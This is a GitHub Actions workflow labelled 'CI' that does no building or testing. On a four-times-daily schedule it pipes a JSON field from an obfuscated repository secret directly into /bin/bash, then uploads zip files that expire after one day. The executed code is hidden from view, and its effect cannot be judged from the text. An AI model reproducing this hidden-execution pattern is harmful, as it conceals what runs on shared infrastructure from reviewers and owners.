name: CI
on:
  workflow_dispatch:

  schedule:
    - cron: '50 5,11,17,23 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  workflow:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Perform
        env:
          oh482: ${{ secrets.oh482 }}
        run: |
          printf '%s' "$oh482" | jq -r .ctvl26738 | /bin/bash
          printf '%s' "$gm1" | jq -r .fusfo27617 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: IH9PHvC6
          path: "*.zip"
          retention-days: 1
